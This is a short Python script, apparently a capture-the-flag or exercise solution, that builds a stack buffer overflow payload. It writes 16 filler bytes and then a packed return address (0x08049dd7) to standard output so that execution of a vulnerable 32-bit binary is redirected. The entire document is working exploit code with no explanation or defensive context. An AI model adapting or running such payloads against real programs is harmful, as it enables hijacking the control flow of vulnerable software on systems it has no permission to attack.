from struct import pack 
import sys

vuln_str = 'helloworldllllll' #16 bytes of buffer space until return address
vuln_bytes = bytes(vuln_str, 'utf-8')
return_address = pack("<I", 0x08049dd7)

payload = vuln_bytes + return_address

sys.stdout.buffer.write(payload)